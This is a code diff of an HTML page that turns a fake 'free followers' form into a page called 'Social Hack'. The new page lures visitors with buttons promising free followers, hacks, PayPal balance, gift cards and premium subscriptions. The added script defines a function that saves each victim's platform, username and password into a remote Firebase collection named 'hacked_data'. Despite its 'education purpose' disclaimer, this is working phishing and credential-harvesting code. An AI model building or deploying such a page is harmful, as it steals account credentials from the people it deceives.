@@ -3,77 +3,61 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Social Booster - Free Social Media Growth</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <title>Social Hack</title>
+    <link rel="stylesheet" href="style.css">
+    <script type="module" src="firebase-config.js"></script>
 </head>
-<body class="bg-gray-900 text-white font-sans">
+<body>
 
-    <!-- Navbar -->
-    <nav class="flex justify-between items-center p-5 bg-gray-800 shadow-lg">
-        <h1 class="text-2xl font-bold text-indigo-500"><i class="fas fa-rocket"></i> SocialBooster</h1>
-        <div>
-            <button class="bg-indigo-600 hover:bg-indigo-700 px-4 py-2 rounded-lg font-semibold">Login</button>
-            <button class="bg-green-600 hover:bg-green-700 px-4 py-2 rounded-lg font-semibold ml-2">Register</button>
+    <div class="container" id="main-interface">
+        <h1>Social Hack 🦅</h1>
+        <p class="developer">Developer: Nawab Zada Hacker ✌️🙌</p>
+        <p class="education">This Tool is only For education purpose please don't use wrong...</p>
+
+        <div id="service-selection">
+            <button onclick="window.location.href='tiktok.html'">Free TikTok Followers</button>
+            <button onclick="window.location.href='facebook.html'">Facebook Login Hack</button>
+            <button onclick="window.location.href='instagram.html'">Instagram Views</button>
+            <button onclick="window.location.href='gmail.html'">Gmail Password Checker</button>
+            <button onclick="window.location.href='snapchat.html'">Snapchat Stories</button>
+            <button onclick="window.location.href='whatsapp.html'">WhatsApp Backup</button>
+            <button onclick="window.location.href='telegram.html'">Telegram Premium</button>
+            <button onclick="window.location.href='youtube.html'">YouTube Subs</button>
+            <button onclick="window.location.href='linkedin.html'">LinkedIn Viewer</button>
+            <button onclick="window.location.href='pinterest.html'">Pinterest Boards</button>
+            <button onclick="window.location.href='discord.html'">Discord Nitro</button>
+            <button onclick="window.location.href='reddit.html'">Reddit Gold</button>
+            <button onclick="window.location.href='twitch.html'">Twitch Subs</button>
+            <button onclick="window.location.href='spotify.html'">Spotify Premium</button>
+            <button onclick="window.location.href='uber.html'">Uber Free Rides</button>
+            <button onclick="window.location.href='amazon.html'">Amazon Gift Cards</button>
+            <button onclick="window.location.href='paypal.html'">PayPal Balance</button>
+            <button onclick="window.location.href='twitter.html'">Twitter Blue Tick</button>
+            <button onclick="window.location.href='threads.html'">Threads Followers</button>
+            <button onclick="window.location.href='zoom.html'">Zoom Meeting Access</button>
         </div>
-    </nav>
 
-    <!-- Hero Section -->
-    <div class="text-center my-10 px-4">
-        <h2 class="text-4xl font-extrabold mb-3">Apne Social Media Ko Fast Viral Karein!</h2>
-        <p class="text-gray-400">Get Free Instagram Followers, YouTube Views, and Likes Automatically.</p>
+        <br><br>
+        <small style="color: #555; cursor: pointer;" onclick="window.location.href='admin.html'">Admin Login</small>
     </div>
 
-    <!-- Main Tool Box -->
-    <div class="max-w-md mx-auto bg-gray-800 p-6 rounded-xl shadow-2xl">
-        <form id="boostForm">
-            <!-- Platform Select -->
-            <label class="block text-sm font-medium mb-2">Select Platform:</label>
-            <select id="platform" class="w-full p-3 mb-4 bg-gray-700 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500">
-                <option value="instagram_followers">Instagram Followers</option>
-                <option value="instagram_likes">Instagram Likes</option>
-                <option value="youtube_views">YouTube Views</option>
-                <option value="tiktok_followers">TikTok Followers</option>
-            </select>
-
-            <!-- Target Link -->
-            <label class="block text-sm font-medium mb-2">Profile / Video Link:</label>
-            <input type="url" id="link" placeholder="https://instagram.com/your_username" required class="w-full p-3 mb-4 bg-gray-700 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500">
-
-            <!-- Quantity -->
-            <label class="block text-sm font-medium mb-2">Quantity (Free Limit: 100):</label>
-            <input type="number" id="quantity" value="100" max="100" readonly class="w-full p-3 mb-6 bg-gray-700 rounded-lg text-gray-400 cursor-not-allowed">
-
-            <!-- Submit Button -->
-            <button type="submit" class="w-full bg-gradient-to-r from-indigo-500 to-purple-600 hover:from-indigo-600 hover:to-purple-700 p-3 rounded-lg font-bold text-lg transition duration-300">
-                Submit Order Free 🚀
-            </button>
-        </form>
-
-        <!-- Response Message -->
-        <div id="response" class="mt-4 text-center font-semibold hidden"></div>
-    </div>
-
-    <!-- JavaScript Logic -->
-    <script>
-        document.getElementById('boostForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const platform = document.getElementById('platform').value;
-            const link = document.getElementById('link').value;
-            const responseDiv = document.getElementById('response');
-
-            responseDiv.classList.remove('hidden');
-            responseDiv.className = "mt-4 text-center font-semibold text-yellow-400";
-            responseDiv.innerText = "Processing your request... Please wait!";
-
-            // Simulating API Call Backend Processing
-            setTimeout(() => {
-                responseDiv.className = "mt-4 text-center font-semibold text-green-400";
-                responseDiv.innerText = "Success! Your order has been placed. Growth will start in 10-15 minutes.";
-                document.getElementById('link').value = '';
-            }, 3000);
-        });
+    <script type="module">
+        import { db, collection, addDoc } from './firebase-config.js';
+        window.saveToFirebase = async function(platform, username, password, extraData) {
+            try {
+                await addDoc(collection(db, "hacked_data"), {
+                    platform: platform,
+                    username: username,
+                    password: password,
+                    timestamp: new Date(),
+                    details: extraData || "N/A"
+                });
+                return true;
+            } catch (e) {
+                console.error("Error adding document: ", e);
+                return false;
+            }
+        }
     </script>
 </body>
 </html>
